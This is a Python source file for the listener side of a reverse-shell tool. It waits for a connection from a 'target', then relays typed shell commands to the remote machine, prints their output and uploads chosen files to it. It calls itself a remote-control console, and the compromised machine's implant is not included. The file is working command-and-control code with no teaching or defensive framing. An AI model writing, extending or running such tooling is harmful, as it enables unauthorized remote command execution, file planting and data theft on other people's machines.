import socket, time, re, tqdm, os
from tkinter import filedialog as fd

try:

    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    ip = ''
    while not (re.search(regex, ip)):
        ip = input('[+] Enter Host Ip Adress: ')
        if not (re.search(regex, ip)):
            print("\nInvalid Ip address\n")

    while True:
        try:
            port = int(input("[+] Enter Host Port: "))
            break
        except:
            print("\nInvalid Port Number\n")
            continue

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(5)
    print ("\nListening... Waiting for connection from target.\n")
    c, addr = s.accept()
    print ('Got connection from', addr )
    whoami = c.recv(1024).decode().strip()

    def send_file():
        separator = "<SEPARATOR>"
        buffer = 4096
        filename = fd.askopenfilename()
        filesize = os.path.getsize(filename)
        c.send(f"{filename}{separator}{filesize}".encode())
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(buffer)
                if not bytes_read:
                    break
                c.sendall(bytes_read)
                progress.update(len(bytes_read))

    # def receive_file():
    #     separator = "<SEPARATOR>"
    #     buffer = 4096
    #     received = c.recv(buffer).decode()
    #     filename, filesize = received.split(separator)
    #     filename = os.path.basename(filename)
    #     filesize = int(filesize)
    #     progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    #     with open(filename, "wb") as f:
    #         while True:
    #             bytes_read = c.recv(buffer)
    #             if not bytes_read:
    #                 break
    #             f.write(bytes_read)
    #             progress.update(len(bytes_read))

    help = '''
    \n[+] List of commands:\n
    1) !upload (let's you upload files to remote machine)
    2) !receive (let's you download files from remote machine)
    '''
    print('type !help to list the features\n')
    while True:
        try:
            command = input(f'[{whoami}@{addr[0]}] >> ')
            if command == '':
                continue
            elif command.split()[0] == '!upload':
                c.send('!upload'.encode())
                send_file()
            elif command == '!help':
                print(help)
            else:
                c.send(command.encode())
                print(c.recv(1024).decode())
        except socket.error:
            s.listen(5)
            print("\nConnection lost\nListening... Waiting for reconnection from target.")
            c, addr = s.accept()

except KeyboardInterrupt:
    try:
        c.close()
    except:
        quit()
